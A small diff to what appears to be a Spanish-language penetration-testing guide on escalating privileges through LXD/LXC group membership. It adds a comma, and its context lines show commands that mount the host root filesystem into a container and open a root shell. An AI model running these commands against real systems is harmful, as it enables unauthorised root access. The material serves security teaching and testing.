@@ -52,7 +52,7 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 > Si encuentras este error _**Error: No se encontró ningún grupo de almacenamiento. Por favor, crea un nuevo grupo de almacenamiento**_\
 > Ejecuta **`lxd init`** y **repite** el bloque anterior de comandos
 
-Finalmente puedes ejecutar el contenedor y obtener root:
+Finalmente, puedes ejecutar el contenedor y obtener root:
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
